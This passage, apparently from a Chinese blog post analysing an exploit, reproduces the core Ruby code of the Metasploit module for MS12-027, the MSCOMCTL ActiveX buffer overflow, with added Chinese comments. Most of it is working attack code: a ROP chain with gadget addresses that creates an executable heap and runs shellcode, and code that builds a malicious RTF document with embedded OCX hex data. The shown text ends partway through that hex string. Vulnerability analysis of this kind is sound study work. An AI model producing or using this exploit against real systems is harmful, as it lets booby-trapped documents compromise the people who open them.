<h2 id="Exploit-分析"><a href="#Exploit-分析" class="headerlink" title="Exploit 分析"></a>Exploit 分析</h2><p>该模块的 exp 位于</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/fileformat/ms12_027_mscomctl_bof.rb</span><br></pre></td></tr></table></figure></div>

<p>exp 的核心代码为</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line">    <span class="title class_">Rank</span> = <span class="title class_">AverageRanking</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="title class_">Msf::Exploit::FILEFORMAT</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span><br><span class="line">        <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">        <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&#x27;MS12-027 MSCOMCTL ActiveX Buffer Overflow&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Description&#x27;</span>    =&gt; <span class="string">%q&#123;...&#125;</span>,</span><br><span class="line">        <span class="string">&#x27;License&#x27;</span>        =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">        <span class="string">&#x27;Author&#x27;</span>         =&gt; [...],</span><br><span class="line">        <span class="string">&#x27;References&#x27;</span>     =&gt; [...],</span><br><span class="line">        <span class="string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;...&#125;,</span><br><span class="line">        <span class="string">&#x27;Payload&#x27;</span>        =&gt; &#123;...&#125;,</span><br><span class="line">        <span class="string">&#x27;Platform&#x27;</span>       =&gt; <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Targets&#x27;</span>        =&gt; [...],</span><br><span class="line">        <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&#x27;2012-04-10&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">        register_options([...])</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#* 将输入的字节数据转换为十六进制字符串并溢出 \x 前缀</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stream</span>(<span class="params">bytes</span>)</span><br><span class="line">        <span class="title class_">Rex</span><span class="symbol">:</span><span class="symbol">:Text</span>.to_hex(bytes).gsub(<span class="string">&quot;\\x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#* 生成包含随机值的数组用于填充 ROP 链中的空白部分</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">junk</span>(<span class="params">n=<span class="number">1</span></span>)</span><br><span class="line">        tmp = []</span><br><span class="line">        value = rand_text(<span class="number">4</span>).unpack(<span class="string">&quot;L&quot;</span>)[<span class="number">0</span>].to_i</span><br><span class="line">        n.times &#123; tmp &lt;&lt; value &#125;</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Ikazuchi ROP chain (msgr3en.dll)</span></span><br><span class="line">    <span class="comment"># Credits to Abysssec</span></span><br><span class="line">    <span class="comment"># http://abysssec.com/files/The_Arashi.pdf</span></span><br><span class="line">    <span class="comment">#* 创建 RWX 内存区域并把 shellcode 从栈中复制到这片内存区域中执行</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_rop_chain</span></span><br><span class="line">        rop_gadgets = [</span><br><span class="line">            <span class="number">0x3F2CB9E0</span>, <span class="comment"># POP ECX # RETN</span></span><br><span class="line">            <span class="number">0x3F10115C</span>, <span class="comment"># HeapCreate() IAT = 3F10115C</span></span><br><span class="line">            <span class="comment"># EAX == HeapCreate() Address</span></span><br><span class="line">            <span class="number">0x3F389CA5</span>, <span class="comment"># MOV EAX,DWORD PTR DS:[ECX] # RETN</span></span><br><span class="line">            <span class="comment"># Call HeapCreate() and Create a Executable Heap. After this call, EAX contain our Heap Address.</span></span><br><span class="line">            <span class="number">0x3F39AFCF</span>, <span class="comment"># CALL EAX # RETN</span></span><br><span class="line">            <span class="number">0x00040000</span>,</span><br><span class="line">            <span class="number">0x00010000</span>,</span><br><span class="line">            <span class="number">0x00000000</span>,</span><br><span class="line">            <span class="number">0x3F2CB9E0</span>, <span class="comment"># POP ECX # RETN</span></span><br><span class="line">            <span class="number">0x00008000</span>, <span class="comment"># pop 0x00008000 into ECX</span></span><br><span class="line">            <span class="comment"># add ECX to EAX and instead of calling HeapAlloc, now EAX point to the RWX Heap</span></span><br><span class="line">            <span class="number">0x3F39CB46</span>, <span class="comment"># ADD EAX,ECX # POP ESI # RETN</span></span><br><span class="line">            junk,</span><br><span class="line">            <span class="number">0x3F2CB9E0</span>, <span class="comment"># POP ECX # RETN</span></span><br><span class="line">            <span class="number">0x3F3B3DC0</span>, <span class="comment"># pop 0x3F3B3DC0 into ECX, it is a writable address.</span></span><br><span class="line">            <span class="comment"># storing our RWX Heap Address into 0x3F3B3DC0 ( ECX ) for further use ;)</span></span><br><span class="line">            <span class="number">0x3F2233CC</span>, <span class="comment"># MOV DWORD PTR DS:[ECX],EAX # RETN</span></span><br><span class="line">            <span class="number">0x3F2D59DF</span>, <span class="comment">#POP EAX # ADD DWORD PTR DS:[EAX],ESP # RETN</span></span><br><span class="line">            <span class="number">0x3F3B3DC4</span>, <span class="comment"># pop 0x3F3B3DC4 into EAX , it is writable address with zero!</span></span><br><span class="line">                        <span class="comment"># then we add ESP to the Zero which result in storing ESP into that address,</span></span><br><span class="line">                        <span class="comment"># we need ESP address for copying shellcode ( which stores in Stack ),</span></span><br><span class="line">                        <span class="comment"># and we have to get it dynamically at run-time, now with my tricky instruction, we have it!</span></span><br><span class="line">            <span class="number">0x3F2F18CC</span>, <span class="comment"># POP EAX # RETN</span></span><br><span class="line">            <span class="number">0x3F3B3DC4</span>, <span class="comment"># pop 0x3F3B3DC4 ( ESP address ) into EAX</span></span><br><span class="line">            <span class="comment"># makes ECX point to nearly offset of Stack.</span></span><br><span class="line">            <span class="number">0x3F2B745E</span>, <span class="comment"># MOV ECX,DWORD PTR DS:[EAX] #RETN</span></span><br><span class="line">            <span class="number">0x3F39795E</span>, <span class="comment"># POP EDX # RETN</span></span><br><span class="line">            <span class="number">0x00000024</span>, <span class="comment"># pop 0x00000024 into EDX</span></span><br><span class="line">            <span class="comment"># add 0x24 to ECX ( Stack address )</span></span><br><span class="line">            <span class="number">0x3F39CB44</span>, <span class="comment"># ADD ECX,EDX # ADD EAX,ECX # POP ESI # RETN</span></span><br><span class="line">            junk,</span><br><span class="line">            <span class="comment"># EAX = ECX</span></span><br><span class="line">            <span class="number">0x3F398267</span>, <span class="comment"># MOV EAX,ECX # RETN</span></span><br><span class="line">            <span class="comment"># mov EAX ( Stack Address + 24 = Current ESP value ) into the current Stack Location,</span></span><br><span class="line">            <span class="comment"># and the popping it into ESI ! now ESI point where shellcode stores in stack</span></span><br><span class="line">            <span class="number">0x3F3A16DE</span>, <span class="comment"># MOV DWORD PTR DS:[ECX],EAX # XOR EAX,EAX # POP ESI # RETN</span></span><br><span class="line">            <span class="comment"># EAX = ECX</span></span><br><span class="line">            <span class="number">0x3F398267</span>, <span class="comment"># MOV EAX,ECX # RETN</span></span><br><span class="line">            <span class="number">0x3F2CB9E0</span>, <span class="comment"># POP ECX # RETN</span></span><br><span class="line">            <span class="number">0x3F3B3DC0</span>, <span class="comment"># pop 0x3F3B3DC0 ( Saved Heap address ) into ECX</span></span><br><span class="line">            <span class="comment"># makes EAX point to our RWX Heap</span></span><br><span class="line">            <span class="number">0x3F389CA5</span>, <span class="comment"># MOV EAX,DWORD PTR DS:[ECX] # RETN</span></span><br><span class="line">            <span class="comment"># makes EDI = Our RWX Heap Address</span></span><br><span class="line">            <span class="number">0x3F2B0A7C</span>, <span class="comment"># XCHG EAX,EDI # RETN 4</span></span><br><span class="line">            <span class="number">0x3F2CB9E0</span>, <span class="comment"># POP ECX # RETN</span></span><br><span class="line">            junk,</span><br><span class="line">            <span class="number">0x3F3B3DC0</span>, <span class="comment"># pop 0x3F3B3DC0 ( Saved Heap address ) into ECX</span></span><br><span class="line">            <span class="comment"># makes EAX point to our RWX Heap</span></span><br><span class="line">            <span class="number">0x3F389CA5</span>, <span class="comment"># MOV EAX,DWORD PTR DS:[ECX] # RETN</span></span><br><span class="line">            <span class="comment"># just skip some junks</span></span><br><span class="line">            <span class="number">0x3F38BEFB</span>, <span class="comment"># ADD AL,58 # RETN</span></span><br><span class="line">            <span class="number">0x3F2CB9E0</span>, <span class="comment"># POP ECX # RETN</span></span><br><span class="line">            <span class="number">0x00000300</span>, <span class="comment"># pop 0x00000300 into ECX ( 0x300 * 4 = Copy lent )</span></span><br><span class="line">            <span class="comment"># Copy shellcode from stack into RWX Heap</span></span><br><span class="line">            <span class="number">0x3F3441B4</span>, <span class="comment"># REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI] # POP EDI # POP ESI # RETN</span></span><br><span class="line">            junk(<span class="number">2</span>), <span class="comment"># pop into edi # pop into esi</span></span><br><span class="line">            <span class="number">0x3F39AFCF</span> <span class="comment"># CALL EAX # RETN</span></span><br><span class="line">        ].flatten.pack(<span class="string">&quot;V*&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># To avoid shellcode being corrupted in the stack before ret</span></span><br><span class="line">        rop_gadgets &lt;&lt; <span class="string">&quot;\x90&quot;</span> * target[<span class="string">&#x27;RopOffset&#x27;</span>] <span class="comment"># make_nops doesn&#x27;t have sense here</span></span><br><span class="line">        <span class="keyword">return</span> rop_gadgets</span><br><span class="line"></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">        <span class="comment">#* 目标系统的返回地址，例如魔法跳转地址 0x7FFA4512</span></span><br><span class="line">        ret_address = stream([target.ret].pack(<span class="string">&quot;V&quot;</span>))</span><br><span class="line">        <span class="comment">#* 创建 shellcode</span></span><br><span class="line">        <span class="keyword">if</span> target[<span class="string">&#x27;Rop&#x27;</span>]</span><br><span class="line">            shellcode = stream(create_rop_chain)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment"># To avoid shellcode being corrupted in the stack before ret</span></span><br><span class="line">            shellcode = stream(make_nops(target[<span class="string">&#x27;Offset&#x27;</span>]))</span><br><span class="line">            shellcode &lt;&lt; stream(<span class="title class_">Metasm</span><span class="symbol">:</span><span class="symbol">:Shellcode</span>.assemble(<span class="title class_">Metasm</span><span class="symbol">:</span><span class="symbol">:Ia32</span>.new, <span class="string">&quot;jmp $+6&quot;</span>).encode_string)</span><br><span class="line">            shellcode &lt;&lt; stream(make_nops(<span class="number">4</span>))</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        shellcode &lt;&lt; stream(payload.encoded)</span><br><span class="line">        <span class="keyword">while</span> shellcode.length &lt; <span class="number">2378</span></span><br><span class="line">            shellcode += <span class="string">&quot;0&quot;</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="comment">#* 构造 RTF 文件</span></span><br><span class="line">        content = <span class="string">&quot;&#123;\\rtf1&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;&#123;\\fonttbl&#123;\\f0\\fnil\\fcharset0 Verdana;&#125;&#125;&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;\\viewkind4\\uc1\\pard\\sb100\\sa100\\lang9\\f0\\fs22\\par&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;\\pard\\sa200\\sl276\\slmult1\\lang9\\fs22\\par&quot;</span></span><br><span class="line">        <span class="comment">#* 嵌入 OCX 空间</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;&#123;\\object\\objocx&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;&#123;\\*\\objdata&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;\n&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;01050000020000001B0000004D53436F6D63746C4C69622E4C697374566965774374726C2E320000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000E0000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;\n&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;D0CF11E0A1B11AE1000000000000000000000000000000003E000300FEFF09000600000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000010000000100000000000000001000000200000001000000FEFFFFFF0000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFFFFFFFEFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FEFFFFFF0400000005000000FEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF52006F006F007400200045006E007400&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;72007900000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;000000000000000016000500FFFFFFFFFFFFFFFF020000004BF0D1BD8B85D111B16A00C0F0283628&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;0000000062eaDFB9340DCD014559DFB9340DCD0103000000000600000000000003004F0062006A00&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;49006E0066006F000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;0000000000000000000000000000000012000200FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000600000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;03004F00430058004E0041004D004500000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;000000000000000000000000000000000000000000000000120002010100000003000000FFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000001000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;160000000000000043006F006E00740065006E007400730000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;000000000000000000000000000000000000000000000000000000000000000012000200FFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000020000007E05000000000000FEFFFFFFFEFFFFFF03000000040000000500000006000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;0700000008000000090000000A0000000B0000000C0000000D0000000E0000000F00000010000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;11000000120000001300000014000000150000001600000017000000FEFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;FFFFFFFFFFFFFFFF0092030004000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;00000000000000000000000000000000000000000000000000000000000000004C00690073007400&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;56006900650077004100000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;0000000000000000000000000000000021433412080000006ab0822cbb0500004E087DEB01000600&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;1C000000000000000000000000060001560A000001EFCDAB00000500985D65010700000008000080&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;05000080000000000000000000000000000000001FDEECBD01000500901719000000080000004974&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;6D736400000002000000010000000C000000436F626A640000008282000082820000000000000000&quot;</span></span><br><span class="line">        content &lt;&lt; <span class="string">&quot;000000000000&quot;</span></span><br><span class="line">        